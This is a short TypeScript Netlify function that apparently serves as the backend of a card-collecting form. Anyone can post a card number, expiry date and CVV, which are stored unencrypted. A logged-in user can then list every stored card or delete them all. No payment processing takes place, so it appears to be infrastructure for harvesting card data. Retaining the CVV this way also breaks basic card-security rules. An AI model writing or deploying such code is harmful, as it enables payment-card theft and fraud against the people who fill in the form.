import { getStore } from '@netlify/blobs'
import { getUser } from '@netlify/identity'
import type { Config, Context } from '@netlify/functions'

export default async (req: Request, context: Context) => {
  const store = getStore({ name: 'form-submissions', consistency: 'strong' })

  // POST is open — anyone submitting the form can save data
  if (req.method === 'POST') {
    const body = await req.json()
    const id = `sub_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
    const submission = {
      id,
      cardNumber: body.cardNumber || '',
      expiry: body.expiry || '',
      cvv: body.cvv || '',
      timestamp: new Date().toISOString(),
    }
    await store.setJSON(id, submission)
    return Response.json({ ok: true, id })
  }

  // GET and DELETE require authentication
  const user = await getUser()
  if (!user) {
    return new Response(JSON.stringify({ error: 'No autorizado' }), {
      status: 401,
      headers: { 'Content-Type': 'application/json' },
    })
  }

  if (req.method === 'GET') {
    const { blobs } = await store.list()
    const submissions = []
    for (const blob of blobs) {
      const data = await store.get(blob.key, { type: 'json' })
      if (data) submissions.push(data)
    }
    submissions.sort((a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
    )
    return Response.json({ submissions, count: submissions.length })
  }

  if (req.method === 'DELETE') {
    const { blobs } = await store.list()
    for (const blob of blobs) {
      await store.delete(blob.key)
    }
    return Response.json({ ok: true, deleted: blobs.length })
  }

  return new Response('Method not allowed', { status: 405 })
}

export const config: Config = {
  path: '/api/submissions',
}
